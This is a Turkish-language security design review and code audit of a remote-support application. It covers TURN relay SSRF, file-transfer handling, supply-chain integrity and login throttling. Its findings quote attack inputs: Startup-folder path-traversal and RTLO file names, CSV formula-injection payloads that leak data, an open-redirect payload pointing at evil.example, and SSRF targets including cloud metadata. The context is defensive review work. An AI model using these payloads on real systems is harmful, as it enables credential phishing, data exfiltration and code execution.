Yer: mimari.md:157 ("Admin… yalnız görüntüler/iptal eder"), mimari-api.md `/cancel` (409 PENDING değil), mimari.md:152 (≤5 sn yalnız REST)
- Tehdit: ele geçirilmiş/kötü niyetli teknisyen (A3, dolandırıcı) müşteri makinesini kontrol ederken Admin hesabı
  pasife alır, şifre sıfırlar veya `remote_control.use`'u kapatır — açık WS ve P2P kontrol sürer.
- Eksik kontrol: ACTIVE oturum için Admin/Super Admin "Zorla sonlandır"; deaktivasyon/logout-all/yetki değişimi →
  canlı WS kapatma; `requirePerm` WS'de yalnız istek anında.
- Önerilen tasarım: `POST /sessions/:id/terminate` (Admin aynı tenant, Super Admin), oda → `session.ended{admin}`
  her iki tarafa; istemci `session.ended`'de gate kapatır ve çıkar (mevcut AC-107). `users.deactivate`,
  `logout-all`, auth_session revoke, yetki geri alımı → `rooms.endByTechnician(userId)` ve `remote_control.use`
  kaldırıldıysa misafire `control.revoke` (istemci gate kapatır). WS tech soketi her 60 sn auth_session'ı yeniden doğrular. Audit `session.terminated`.
- Paket: P3 (rooms), P7 (control.revoke), P9 (deaktivasyon), P10 (logout-all).

### [YÜKSEK] G-05 TURN `denied-peer-ip` listesi eksik — A10 SSRF
Yer: adr/0007 "Karar", mimari.md:174 (T9)
- Tehdit: anonim misafir (join sonrası TURN credential alır) relay ile kendi altyapımıza erişir: uygulama sunucusu
  185.126.217.99 (MySQL/metrics/iç portlar dışa açıksa), Proxmox 185.126.217.113 yönetim arayüzü, TURN VM'nin
  kendisi, aynı /24'teki diğer sunucular; IPv4-mapped IPv6 (`::ffff:10.0.0.1`), NAT64 (`64:ff9b::/96`), 6to4 (`2002::/16`) ile özel aralık atlatma.
- Eksik kontrol: kendi public IP'lerimiz ve geçiş aralıkları listede yok.
- Önerilen tasarım: listeye ekle — `192.0.0.0/24`, `192.0.2.0/24`, `198.18.0.0/15`, `198.51.100.0/24`,
  `203.0.113.0/24`, `224.0.0.0/4`, `240.0.0.0/4`, `255.255.255.255`, `::/128`, `::ffff:0:0/96`, `64:ff9b::/96`,
  `100::/64`, `2001::/32`, `2001:db8::/32`, `2002::/16`, `ff00::/8`, **TURN VM IP, 185.126.217.99, 185.126.217.0/24
  (sağlayıcı bloğu; meşru müşteri bu bloktan gelmeyecek), Proxmox yönetim IP'si**. `turnserver.conf` için
  `turnutils_uclient` ile her aralığa negatif test P3 "bitti" kanıtına eklensin. `no-tcp-relay` korunur.
- Paket: P3 (`deploy/turn/turnserver.conf`), P13 (runbook: IP değişiminde listeyi güncelle).

### [YÜKSEK] G-06 Gelen dosyada yol/ad saldırıları, MOTW yok, uyarı listesi eksik — A08 Bütünlük / A03 Enjeksiyon
Yer: mimari-protokol.md §4.1 `file.offer.name`, §4.2 (Go `%USERPROFILE%\Downloads`), AC-36
- Tehdit: teknisyen (veya müşteri yerine geçen saldırgan teknisyene) `name="..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.exe"`,
  ADS `rapor.txt:evil.exe`, aygıt adları (`CON`, `NUL`), sondaki nokta/boşluk, RTLO (`U+202E`) ile `fatura‮fdp.exe` → ".pdf" görünen exe;
  MOTW olmadan alınan exe SmartScreen'siz çalışır.
- Eksik kontrol: ad temizleme kuralı, MOTW, tam tehlikeli uzantı listesi, gerçek bayt sayısına göre sınır.
- Önerilen tasarım: alıcı tarafta (Go + tarayıcı) `filepath.Base` + `[\\/:*?"<>|\x00-\x1F]` ve Unicode bidi/format
  karakterleri (Cf kategorisi) silinir, ayrılmış adlar ön ek alır, uzunluk ≤ 255; çakışmada `(1)` eklenir, üzerine yazılmaz.
  Go istemci yazılan dosyaya `:Zone.Identifier` (`ZoneId=3`) ADS ekler. Uyarı listesine `.lnk .hta .cpl .msc .jar .dll .com .pif .reg .scf .url .chm .wsf .psm1 .iso .img .vhd .vhdx .appx .msix .appinstaller .application .xll .docm .xlsm`
  eklenir; çift uzantı (`.pdf.exe`) ayrıca vurgulanır. Alıcı `size` yerine **alınan bayt** sayacına göre `maxFileBytes` aşımında keser.
- Paket: P5 (contracts `dc.ts`, web alıcı), P6 (Go alıcı).

### [YÜKSEK] G-07 İmzasız binary bütünlüğü yalnız aynı kaynaktan doğrulanıyor — A08 Yazılım/Veri Bütünlüğü
Yer: adr/0010 "Hash yayını", mimari.md:178 (T13), tasarim-kontrol.md:58
- Tehdit: publish sunucusu ele geçirilirse saldırgan exe'yi, `AGENT_SHA256` env'ini ve karşılama sayfasındaki hash'i
  birlikte değiştirir → tüm müşterilere zararlı dağıtılır; aynı origin'deki hash hiçbir şey kanıtlamaz. Fork'lanmış
  açık kaynak koddan "NoktaDestek" versioninfo'lu, dolandırıcı sunucuya bağlı kopya ayırt edilemez.
- Eksik kontrol: sunucudan bağımsız imza/köken kanıtı.
- Önerilen tasarım: (1) `agent-win.yml`'de GitHub Artifact Attestations (`actions/attest-build-provenance`,
  SLSA provenance, ücretsiz) + Sigstore/cosign veya çevrim dışı anahtarlı **minisign** imzası Release'e;
  (2) sunucu açılışta binary hash'ini env değil, CI'nın imzaladığı `SHA256SUMS.minisig`'i gömülü açık anahtarla
  doğrular; (3) istemci karşılama penceresi kendi SHA-256 parmak izinin ilk 8 hanesini ve bağlandığı alan adını
  gösterir, teknisyen konsolu beklenen değeri gösterir (telefonla teyit); (4) SignPath Foundation başvurusu "Sonra"
  değil P6 ile paralel başlatılsın; (5) `serverURL` ldflags dışında değiştirilemez (komut satırı/env/registry yok).
- Paket: P6, P13 (runbook: imza anahtarı saklama/rotasyon).

### [YÜKSEK] G-08 DLL arama sırası ele geçirme (Downloads klasöründen çalışan imzasız exe) — A08
Yer: adr/0004/0010 (Go + `go-ole`, Media Foundation), mimari.md:353
- Tehdit: exe `Downloads`'tan çalışır; aynı klasöre daha önce (drive-by) indirilmiş `version.dll`, `dwmapi.dll`,
  `mfplat.dll`, `winmm.dll` vb. süreç tarafından yüklenir → müşteri kullanıcısı bağlamında kod çalışır, üstelik
  "Nokta Destek" adına. `syscall.NewLazyDLL`/`LoadLibrary` uygulama dizinini önce arar.
- Eksik kontrol: DLL yükleme politikası tanımsız.
- Önerilen tasarım: `main` başında `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)`; tüm DLL'ler
  `windows.NewLazySystemDLL`; `go-ole` ve üçüncü parti paketler incelenir (gerekirse ince sarmalayıcı);
  PE import tablosunda yalnız KnownDLLs/System32; `%TEMP%`'e DLL/çalıştırılabilir çıkarma yasak.
  P6 "bitti" kanıtına: Procmon ile Downloads dizininde DLL arama olayı 0.
- Paket: P6.

### [ORTA] G-09 P2P yetkiler sunucuda uygulanamıyor (`file_transfer.use`); kontrol isteği kanalı — A01
Yer: mimari-api.md yetki tablosu, mimari-protokol.md §3 `file.meta` ("iki taraf→S"), §4.1
- Tehdit: `file_transfer.use` yetkisi olmayan teknisyen tarayıcı JS'ini değiştirip `ctl` DC'den `file.offer` yollar;
  sunucu yalnız (isteğe bağlı) `file.meta` görür. Benzer şekilde `control.request` DC'den gelirse istemci diyalog açabilir.
- Önerilen tasarım: sunucu `hello` (guest) içinde teknisyen yetenek listesini (`caps: ["file_transfer","remote_control"]`)
  gönderir; istemci/müşteri sayfası listede olmayan DC isteklerini reddeder; `control.request` yalnız WS (sunucu)
  kaynağından kabul edilir, DC'de bu tip yok sayılır; yetki değişince `caps.update` (G-04).
- Paket: P5, P6, P7.

### [ORTA] G-10 Ticket ve reconnectToken URL sorgusunda; reconnect ile gerçek misafiri düşürme — A07
Yer: mimari-protokol.md §1 (`?ticket=`, `&reconnect=`), mimari.md:277 (redaksiyon yalnız `/session/<token>`)
- Tehdit: Caddy access log / pino `req.url` sorgu dizesini yazar; `reconnectToken` oturum boyu geçerli → log
  okuyan biri kopma penceresinde misafir yuvasını ele geçirir; misafir bağlıyken reconnect davranışı tanımsız.
- Önerilen tasarım: ticket/reconnect `Sec-WebSocket-Protocol` başlığında veya upgrade sonrası ilk `auth` mesajında
  (5 sn timeout); Caddy log formatında sorgu dizesi maskelenir; reconnect yalnız `guestSocket` yokken kabul,
  aksi halde ret + audit `reconnect.conflict`; reconnect sonrası G-01 lobisine gerek yok ama kontrol `VIEW` (mevcut).
- Paket: P3, P1 (Caddy log).

### [ORTA] G-11 Gerçek istemci IP'si (trustProxy) ve IPv6 limit birimi tanımsız — A04
Yer: mimari.md:154, :166; tasarim-kontrol.md:36
- Tehdit: Fastify `trustProxy: true` ile `X-Forwarded-For` sahtelenir → tüm IP limitleri (login 20/dk, resolve
  10/dk) atlanır; tek IPv6 /64 sınırsız adres sağlar.
- Önerilen tasarım: `trustProxy` yalnız Caddy konteyner adresi; Caddy gelen XFF'yi ezer; limit anahtarı IPv4 /32, IPv6 /64.
- Paket: P1, P3.

### [ORTA] G-12 SMTP/MySQL test uçlarıyla iç ağ taraması (SSRF) — A10
Yer: mimari-api.md `/settings/smtp/test`, `/admin/settings/mysql/test`
- Tehdit: tenant Admin'i (Super Admin'den az güvenilir) SMTP host'una `mysql`, `server:3001`, `169.254.169.254`,
  Proxmox LAN adresleri yazar; ayrıntılı hata/banner ve süre farkıyla port taraması yapar.
- Önerilen tasarım: tenant SMTP host'u çözümlenen IP özel/loopback/link-local/Docker ağıysa ret (DNS rebinding için
  bağlantı çözümlenen IP'ye yapılır); hata mesajı genel ("bağlanılamadı/kimlik reddedildi"); test 5/dk; MySQL testi yalnız Super Admin (mevcut) + audit.
- Paket: P10, P11.

### [ORTA] G-13 Anonim misafire 4 saatlik TURN credential; bant sınırı yok — A04
Yer: adr/0007 (expiry ≤ 4 sa, `user-quota=4`)
- Tehdit: join yapan (veya G-01 ile sızan) misafir credential'ı oturum bittikten sonra da kullanır → anonim relay
  (kaynak gizleme, bant tüketimi). HMAC credential iptal edilemez.
- Önerilen tasarım: ömür `min(kalan süre, 60 dk)` ve WS üzerinden `ice.refresh` ile yenileme; misafire credential
  yalnız admit sonrası (G-01); coturn `max-bps` (ör. 6 Mbps) ve `bps-capacity`; Prometheus'ta oturumsuz allocation alarmı.
- Paket: P3.

### [ORTA] G-14 Sinyalizasyonu kontrol eden DTLS'i MITM edebilir — A02 Kriptografik Hatalar
Yer: mimari.md:178 ("pinning yok"), :188 ("yalnız DTLS-SRTP")
- Tehdit: kurumsal TLS denetim proxy'si (istemci sistem kökünü kullanır) veya ele geçirilmiş sunucu SDP'deki
  `a=fingerprint`'i değiştirip medyayı/girdiyi araya girerek okur/değiştirir; "sunucu medya görmez" iddiası yalnız dürüst sunucuda geçerli.
- Önerilen tasarım: iki uçta her iki DTLS parmak izinden türetilen 4–6 haneli SAS (`HMAC(fpTech||fpGuest)`) konsolda
  ve istemcide gösterilir; kontrol izni diyaloğunda da görünür; uyuşmazlık müşteriye "bağlantı güvenli değil" olarak yansır. Belgede güven varsayımı açık yazılır.
- Paket: P4, P6.

### [ORTA] G-15 Audit maskesi hem eksik hem aşırı; tetikleyici uygulama kullanıcısınca düşürülebilir — A09
Yer: mimari.md:122-124, :283 (`migrate deploy` server başlangıcında)
- Tehdit: regex `ticket`, `credential` (TURN), `recovery`, `cookie`, `authorization`, `sdp` (ICE pwd + iç IP)
  yakalamaz; `key` ise `perm_key`'i maskeler → yetki değişikliği audit'i okunamaz. Uygulama aynı DB kullanıcısıyla
  migration yaptığı için `DROP TRIGGER` yetkisi vardır → audit değiştirilebilir.
- Önerilen tasarım: anahtar adına göre **izinli liste** (`perm_key` açık) + kara liste genişletmesi; iki DB kullanıcısı:
  `migrator` (DDL, yalnız deploy işinde) ve `app` (audit_logs'ta yalnız INSERT/SELECT, TRIGGER/ALTER/DROP yok).
  Audit yazımı başarısızsa kontrol izni olayları (`control.state GRANTED`) reddedilir (fail-closed).
- Paket: P1, P11, P13.

### [ORTA] G-16 CSV export'ta formül enjeksiyonu — A03 Enjeksiyon
Yer: mimari-api.md `/sessions/export.csv`, `/audit/export.csv`
- Tehdit: müşteri adı `=HYPERLINK("http://x/?"&A1)` veya `=cmd|...`; Excel'de açan Admin'de veri sızıntısı/komut.
- Önerilen tasarım: `= + - @ \t \r` ile başlayan hücrelere `'` öneki; customerName, ticket, note, file_name, user_agent dahil. Birim test.
- Paket: P8, P11.

### [ORTA] G-17 Dolandırıcılık (tech-support scam) kötüye kullanım kontrolleri eksik — A04
Yer: mimari.md:168 (T3), tasarim-kontrol.md:61
- Tehdit: A2/A3 meşru tenant içinden (veya kendi kurduğu fork'la) "banka/Microsoft destek" araması yapar; kontrolü
  alıp gösterge üstüne tam ekran topmost pencere açar, banka işlemi yaptırır.
- Önerilen tasarım: (1) istemci + karşılama sayfasında onaydan önce sabit uyarı: "Sizi kendiliğinden arayan biri
  bunu istediyse kapatın; banka/şifre işlemi yapmayın"; (2) ekran karartma/gizli mod özelliği **yasak** (gereksinimlere
  kapsam dışı olarak yazılsın); (3) göstergeler 1 sn'de bir `HWND_TOPMOST` ile yeniden öne alınır, kırmızı çerçeve
  tüm monitörlerde; (4) karşılama/istemcide "Kötüye kullanımı bildir" bağlantısı → Super Admin'e e-posta + audit;
  (5) Super Admin tenant oluştururken firma doğrulaması runbook adımı; (6) oturum sonunda müşteriye özet (teknisyen, süre, kontrol süresi, dosyalar) gösterilir.
- Paket: P4, P6, P7, P13.

### [ORTA] G-18 CI/tedarik zinciri sertleştirmesi tanımsız — A06/A08
Yer: tasarim-kontrol.md:51, :97; adr/0010 "Tekrarlanabilir build"
- Tehdit: üçüncü parti GitHub Action etiketi değiştirilir (tj-actions benzeri), Release yazma yetkili token ile binary değiştirilir.
- Önerilen tasarım: tüm Action'lar commit SHA ile sabit; `permissions:` en az (varsayılan `contents: read`, yalnız release
  işinde `contents: write`, `id-token: write`, `attestations: write`); Release yalnız korumalı `v*` etiketinden ve
  onaylı `environment`'tan; PR'den gelen fork workflow'larına secret yok; `go.sum` + `GOFLAGS=-mod=readonly`,
  `GOTOOLCHAIN` sabit; `pnpm install --frozen-lockfile`; Dependabot/Renovate; Scorecard önerilir.
- Paket: P1, P6.

### [DÜŞÜK] G-19 CSP ayrıntıları — A05 Yanlış Yapılandırma
Yer: mimari.md:194-196
- `connect-src` port içermeli (`wss://<host>:4450`); `style-src` nonce'u `style=""` özniteliklerini kapsamaz →
  geliştirici `'unsafe-inline'` eklemesin, inline style yerine sınıf/CSS değişkeni kuralı yazılsın; `worker-src 'self'`,
  `manifest-src 'self'`, `upgrade-insecure-requests`, `Cross-Origin-Resource-Policy: same-origin` eklensin; Caddy/Next
  `Server`/`X-Powered-By` kaldırılsın. HSTS `includeSubDomains` tüm alan adını etkiler — diğer alt alanların HTTPS olduğu doğrulanmalı. Paket: P1, P4.

### [DÜŞÜK] G-20 Native WS kuralı ve gizli değer entropisi belirsiz — A07
Yer: mimari-protokol.md §1 (`User-Agent: NoktaDestek` kabul)
- User-Agent bir güvenlik kontrolü değildir; belgede "yalnız bilgi" diye yazılsın, kuralı `ticket.kind` belirler (mevcut).
  `joinNonce`, `wsTicket`, `reconnectToken`, `admitCode` dışındakiler için ≥128 bit CSPRNG, karşılaştırma `timingSafeEqual` açıkça tanımlansın. Paket: P3.

### [DÜŞÜK] G-21 Global kısayol kaydı başarısız olabilir — A04
Yer: mimari-protokol.md §4.3 (2), AC-102
- Başka uygulama Ctrl+Shift+F12'yi tutuyorsa `RegisterHotKey` başarısız olur; bu durumda kontrol izni verilmesin veya
  yedek kısayol (Ctrl+Shift+F11) kaydedilip ekranda gösterilsin. Paket: P7.

### [DÜŞÜK] G-22 Oturum kayıtlarında tutarsızlık ve sahiplik ayrıntısı — A01
Yer: mimari-api.md `/sessions` notu ("link… GET /:id PENDING iken") ↔ mimari.md:106 (yalnız `token_hash`)
- Düz token DB'de olmadığına göre GET `/:id` link döndüremez; geliştirici geri döndürülebilir saklamaya kaymasın — metin
  "yalnız POST yanıtında" olarak düzeltilsin. `short_code` düz metin (kısa ömürlü, kabul) ama `active_code` dışında NULL'lansın.
  USER rolü için detay/PATCH/export'ta da `technician_id = user.id` kuralı açıkça yazılsın (yalnız liste değil). Paket: P2, P8.

### [DÜŞÜK] G-23 Hesap kilitleme ile hizmet engelleme; e-posta gönderim limiti — A07
Yer: mimari.md:154, mimari-api.md `/sessions/:id/email`
- Saldırgan bilinen teknisyen e-postalarını 15 dk'da bir kilitler. Öneri: kilit hesap+IP bileşimi, tam kilit yalnız
  IP'den bağımsız 20 hata/sa; kilitli hesaba bildirim e-postası. Oturum linki e-postası teknisyen başına 20/sa. Paket: P1, P10.

### [DÜŞÜK] G-24 `consentTextId` doğrulaması tanımsız — A04
Yer: mimari-api.md `/public/sessions/join`
- Sunucu `consentTextId`'nin oturumun tenant'ına ait ve `is_current` olduğunu doğrulamalı; aksi halde başka tenant'ın/eski metnin onayı kaydedilir. Paket: P4.

### [DÜŞÜK] G-25 Belge çelişkileri — A05
Yer: tasarim-kontrol.md:99 (runbook "kod imzalama yenileme"), gereksinimler AC-27/AC-94/AC-96 ("imzalı")
- İmza yokken runbook maddesi "imza/attestation anahtarı yönetimi" (G-07) olarak değiştirilsin; K8 kapanmadan P6 başlamasın. Paket: P6, P13.

## Otomatik tarama çıktıları
- `npm/pnpm audit`, `govulncheck`, `pip-audit`, `dotnet`: **uygulanamadı** — repoda henüz kaynak kod/lockfile yok (yalnız `docs/`).
- Gizli bilgi taraması (`git grep`): **uygulanamadı** — dizin git deposu değil. `docs/` elle tarandı: gerçek şifre/anahtar/token yok
  (yalnız `TURN_SECRET`, `METRICS_TOKEN` gibi değişken adları).
- `.env` git geçmişi: depo yok; P1'de `.gitignore` + gitleaks ile kurulacak (T18).

## Tasarımda vaat edilip eksik/çelişkili olanlar
- T1 "verifyCode telefonda teyit" → müşteriyi doğrulamaz (resolve'da herkese dönüyor) — G-01.
- T9 "özel IP relay yasağı" → kendi public IP'lerimiz ve IPv6 geçiş aralıkları yok — G-05.
- T13 "SHA-256 doğrulama" → aynı origin; sunucu ele geçirilmesine karşı koruma yok — G-07.
- "Admin iptal eder" → yalnız PENDING; ACTIVE oturumu kesecek yetki yok — G-04.
- `file_transfer.use` yetkisi P2P'de sunucuda uygulanamaz — G-09.
- Audit "değiştirilemez" → migration kullanıcısı = uygulama kullanıcısı, tetikleyici düşürülebilir — G-15.
- Log maskeleme `/session/<token>` dışında WS sorgu dizesini kapsamıyor — G-10.

## Olumlu
- İzin kapısı istemcide, sunucu mesajı açamaz; yeniden bağlanmada kapalı; enjekte olay filtresi; AC-101 otomatik testi.
- Opak DB oturumu (JWT yok), SameSite=Strict + double-submit CSRF + Origin; CORS kapalı.
- Token/nonce/ticket yalnız hash; resolve tüketmez (e-posta tarayıcı ön-getirmesi linki yakmaz); join koşullu UPDATE ile yarışsız.
- TURN `use-auth-secret`, `no-tcp-relay`, `no-cli`, ayrı VM/IP; statik secret istemciye gitmez.
- Upload: magic bytes + sharp yeniden kodlama, SVG yok, nosniff.
- İstemci: admin yok, kalıcılık yok, dinleyen port yok, UPX yok, TLS doğrulamalı, Ctrl+Alt+Del/Win+L iletilmez.
- Açık kaynak için gitleaks + lisans taraması + SBOM planlı; prod açılışı 2FA (P10) sonrasına bağlı.

## Öneri: `docs/gereksinimler.md` §9'a "Sonra" olarak
G-13 (credential yenileme ayrıntısı), G-14 (SAS), G-19..G-25. Yüksek bulgular (G-01..G-08) "Sonra" olamaz;
ilgili paket başlamadan mimari/AC'ye işlenmelidir (G-01, G-02, G-05, G-10, G-13 → P3 öncesi).

## P1 kod turu
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 3 / Düşük 8 — Orta bulgular P2 başlamadan kapatılmalı (S1-1 ve S1-2 düşük maliyetli).

### Bulgular (öncelik sırasıyla)

#### S1-1 [ORTA] `safeNext` sekme/satır sonu ile açık yönlendirme — A01
Yer: apps/web/lib/api.ts:89-92, kullanım apps/web/app/(auth)/login/login-form.tsx:45
Tehdit: `/login?next=%2F%09%2Fevil.example` → `next="/\t/evil.example"` kontrolü geçer; WHATWG URL ayrıştırıcısı
TAB/LF/CR'yi atar → `//evil.example`. Next 16 `router.replace` dış origin'i `completeHardNavigation` ile açar
(navigate-reducer.js:34). Doğrulandı: `new URL("/\t/evil.example", base).origin === "https://evil.example"`.
Kurban başarılı girişten hemen sonra sahte "oturum süresi doldu" sayfasına gider → kimlik bilgisi avı.
Öneri: `const u = new URL(next, location.origin); if (u.origin !== location.origin) return fallback; return u.pathname + u.search;`
ya da `/^\/(?![\/\\])[\x21-\x7e]*$/` izinli kalıbı (kontrol karakteri yok). Birim test: `\t`, `\n`, `\r`, `/\`, `//`, `%09`.
Atanan: frontend-dev

#### S1-2 [ORTA] Hesap geneli kilit sayacı yarışta kaybolur (kayıp güncelleme) — A07 (G-23)
Yer: apps/server/src/auth/service.ts:38-50 (sayım `user.failedLoginCount`'tan, kullanıcı TX dışında :67'de okunur), repo.ts:41-47
Tehdit: argon2 doğrulaması ~onlarca ms sürer; farklı IP'lerden eşzamanlı N deneme hepsi aynı eski sayacı okuyup `count+1` yazar
→ 20/sa hesap geneli sınır pratikte hiç tetiklenmez. Hesap+IP kilidi (5/15 dk) IP sayısıyla çarpılır; dağıtık brute-force'a
karşı kalan tek global sınır etkisizleşir (2FA P10'a kadar yok).
Öneri: atomik artırım — `UPDATE users SET failed_login_count = IF(failed_window_at > NOW(3) - INTERVAL 1 HOUR, failed_login_count + 1, 1), failed_window_at = IF(...)`
sonra değeri oku (veya TX içinde `SELECT ... FOR UPDATE`). Eşzamanlı 25 isteklik entegrasyon testi. Atanan: backend-dev

#### S1-3 [ORTA] Şifre değişimi diğer oturumları düşürmez; mevcut şifre denemesi sınırsız — A07
Yer: apps/server/src/auth/service.ts:105-118, repo.ts:49-51
Tehdit: (a) çalınmış oturum çerezi kurbanın şifre değişiminden sonra da 8 sa'e kadar geçerli kalır (ASVS 3.3.3);
(b) çerezi ele geçiren saldırgan `/auth/password/change` ile `current`'ı limitsiz dener (her deneme argon2 19 MiB → CPU/bellek DoS),
bulunca şifreyi değiştirip hesabı kalıcı ele geçirir.
Öneri: aynı TX'te `auth_sessions` → `revoked_at = now` (mevcut hariç; tercihen mevcut da yenilenir — yeni token + çerez);
`current` hatalarını hesap+IP sayacına bağla (5 hata → oturumu iptal + 423), audit `auth.password_change fail` zaten var.
Atanan: backend-dev

#### S1-4 [DÜŞÜK] `next=` tam yol + sorgu taşıyor (bilinen not) — A04 / G-10
Yer: apps/web/proxy.ts:10, :34-38
Değerlendirme: P1'de `/session/*` sayfası olmadığından bugün sızıntı yok; Caddy sorgu dizesini (Caddyfile:33) ve `Location`'ı
(:41) siliyor, `Referrer-Policy: no-referrer` var, pino `maskUrl` sorguyu atıyor. Risk P2'de doğar: oturumsuz müşteri
`/session/<token>` açınca `/login?next=%2Fsession%2F<token>`'a gider (akış bozulur + token tarayıcı geçmişi/ekran paylaşımında
ikinci URL'de). Şiddet: Düşük, **P2 giriş şartı**.
Öneri: `PUBLIC_PATHS` önek eşleşmeli (`/login`, `/session/`, ileride `/download`); `next` yalnız panel önekleri için ve sorgusuz
üretilsin; `/session/` hiçbir zaman `next`'e yazılmasın (birim test). Atanan: frontend-dev

#### S1-5 [DÜŞÜK] Hesap kilidiyle kullanıcı numaralandırma — A07
Yer: apps/server/src/auth/service.ts:41-57, :70-74
Tehdit: hesap geneli kilit yalnız var olan kullanıcıda oluşur; ≥4 IP'den 20 hatalı deneme sonrası var olan hesap 423,
olmayan 401 döner. Kilitli hesapta argon2 atlanır (zamanlama farkı ama durum kodu zaten farklı). 401 yolları için dummy argon2 doğru.
Öneri: kilit kararı verilen yanıt (`pairLocked||accountLocked`) yerine hesap geneli kilit bilgisini yalnız sonraki doğru şifrede
göster; ya da var olmayan login için de bellek içi hesap sayacı (login adı anahtarlı) tutarak aynı 423'ü üret. Atanan: backend-dev

#### S1-6 [DÜŞÜK] Hesap+IP kilidi eşzamanlı isteklerle 4 kat aşılır — A07
Yer: apps/server/src/auth/service.ts:69 (`blockedFor`) ↔ :78 (`hit`, argon2'den sonra)
Tehdit: aynı IP'den paralel 20 istek kontrolü birlikte geçer → 15 dk'da 5 yerine ~20 deneme (IP limiti 20/dk ile sınırlı).
Öneri: `hit` doğrulamadan önce sayılsın, başarılı girişte `reset`; veya ikili başına uçuşta-istek kilidi. Atanan: backend-dev

#### S1-7 [DÜŞÜK] Audit izinli listesi alt nesneleri maskesiz bırakır — A09 (G-15)
Yer: apps/server/src/audit/mask.ts:31
Tehdit: izinli anahtarın (`source`, `reason`, `result`, `action`…) değeri nesne ise içi taranmadan yazılır;
ileride `{ source: body }` gibi bir çağrı şifreyi açık loglar.
Öneri: izinli anahtar yalnız ilkel değerlerde açık; nesne/dizi ise `maskValue(inner)` ile özyinele. Birim test. Atanan: backend-dev

#### S1-8 [DÜŞÜK] E-posta/kullanıcı adı belirsizliği — A07
Yer: apps/server/src/auth/repo.ts:30-35 (`findFirst` + `OR`)
Tehdit: kullanıcı adı başka birinin e-postasına eşit olabilir (iki ayrı UQ) → `findFirst` sırası belirsiz; kilit/sayaç yanlış
hesaba yazılır, meşru kullanıcı giremez. P9'da kullanıcı oluşturma geldiğinde istismar edilebilir.
Öneri: contracts'ta username kalıbı `@` içermesin (`^[a-z0-9._-]{3,60}$`); login `@` içeriyorsa yalnız e-posta, değilse yalnız username ara. Atanan: backend-dev

#### S1-9 [DÜŞÜK] Çerezlerde `__Host-` öneki yok — A05
Yer: packages/contracts/src/api/auth.ts:56-57, apps/server/src/auth/routes.ts:17
Tehdit: K1 sonrası alan adında kardeş alt alan adı çerez enjekte edebilir (CSRF çerezini sabitleme). Origin kontrolü
CSRF'i yine engeller; derinlik savunması. Öneri: `__Host-rs_session`, `__Host-rs_csrf` (path=/, secure, Domain yok — zaten öyle);
web `proxy.ts:9` sabiti contracts'tan alınsın (çift tanım var). Atanan: backend-dev, frontend-dev

#### S1-10 [DÜŞÜK] Yeni girişte eski oturum iptal edilmez; çıkışta CSRF çerezi yoksa çerezler temizlenmez — A07
Yer: apps/server/src/auth/routes.ts:31-43
Öneri: login'de gelen geçerli `rs_session` varsa revoke; logout CSRF hatasında da (403) en azından çerezleri sil. Atanan: backend-dev

#### S1-11 [DÜŞÜK] CI'da gitleaks imajı etiketle sabit — A08 (G-18)
Yer: .github/workflows/ci.yml:136 (`ghcr.io/gitleaks/gitleaks:v8.30.1`)
Öneri: `@sha256:<digest>` ile sabitle (Action'lar SHA'lı, imaj da aynı kurala girsin); Dependabot `docker` zaten açık. Atanan: devops

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: **1 orta** — `minimatch` (GHSA-g3hv-75wg-m249, 21 yol; eslint/geliştirme zinciri,
  runtime imajına girmez). Öneri: Dependabot PR'ı / `pnpm.overrides`. Kritik/Yüksek yok.
- gitleaks: yerelde kurulu değil, **çalıştırılamadı**; CI'da tüm geçmiş taranıyor (ci.yml:134). Repo'da commit yok.
- semgrep: kurulu değil. Elle `secret|password|token` taraması: gerçek değer yok; `.env.example` yalnız anahtar adları;
  test sabit parolası `.gitleaks.toml` tek dosya istisnasıyla. `.dockerignore` `.env*`, `.git`, `docs`, `deploy`'u dışlıyor.
- `.env` git geçmişi: commit yok; `.gitignore` `.env*`, `*.pem`, `*.key`, `deploy/turn/*.local.conf` kapsıyor.

### G maddeleri (P1'e ait) karşılanma tablosu
| G | Durum | Kanıt / not |
|---|---|---|
| G-10 (Caddy log) | Karşılandı | Caddyfile:30-43 sorgu, `/session/***`, Cookie, Authorization, X-Csrf-Token, Referer, Set-Cookie, Location, Sec-WebSocket-Protocol siliniyor; pino `maskUrl` + redact (logger.ts:5-23). Kalan: S1-4 |
| G-11 (XFF / ipKey) | Karşılandı | app.ts:76 `trustProxy` = `TRUSTED_PROXY_CIDR`; compose:85 + caddy sabit 172.30.0.2; Caddy `trusted_proxies` yok; prod'da zorunlu (env.ts:29); ip.ts IPv4 /32, IPv6 /64, mapped→v4 |
| G-15 (mask + DB kullanıcıları) | Karşılandı (P1 kapsamı) | mask.ts izinli+kara liste; grants.sql:18-19 audit_logs yalnız SELECT/INSERT; app init'te yetkisiz (01-users.sh:33); server'da MIGRATE_DATABASE_URL yok; check-app-grants.sh. Tetikleyici + fail-closed P11. Kalan: S1-7 |
| G-18 (CI) | Kısmen | Action'lar SHA'lı, `permissions: contents: read`, `--frozen-lockfile`, Dependabot npm/actions/docker. Kalan: S1-11 |
| G-19 (CSP/başlıklar) | Karşılandı | proxy.ts nonce + `strict-dynamic`, `unsafe-inline` yok, `connect-src wss://host:port`, worker/manifest, COOP/CORP, Referrer no-referrer, Permissions-Policy; helmet aynı politika; HSTS `includeSubDomains` yok; `-Server`, `poweredByHeader:false`; `dangerouslySetInnerHTML`/`style=` kullanımı yok |
| G-20 (gizli değer) | Karşılandı | ids.ts 256 bit token, `safeEqual` sabit süreli (özetlenmiş) |
| G-23 (kilit DoS) | Kısmen | Hesap+IP (bellek) + hesap geneli 20/sa (DB) + IP 20/dk tasarıma uygun; bildirim e-postası P10. Kalan: S1-2, S1-5, S1-6 |

### Tasarımda vaat edilip kodda bulunmayanlar
- Hesap geneli kilit "yarışsız" değil (S1-2). Şifre değişiminde oturum iptali tasarımda açık değil; P10 `logout-all` beklemeden eklenmeli (S1-3).
- `tenantScope` P1'de tanımlı ama kullanan tenant verisi ucu yok (beklenen); AC-69 aracı (test/helpers/tenant-matrix.ts) mevcut — her pakette genişletilmeli.

### Olumlu
- Opak 256 bit oturum, DB'de yalnız SHA-256; mutlak 8 sa + boşta 30 dk; her istekte DB doğrulaması; pasif kullanıcı/tenant anında düşer.
- Çerez `HttpOnly`(oturum) + `Secure` + `SameSite=Strict`; double-submit CSRF + **login dahil** Origin allowlist; CORS eklentisi yok.
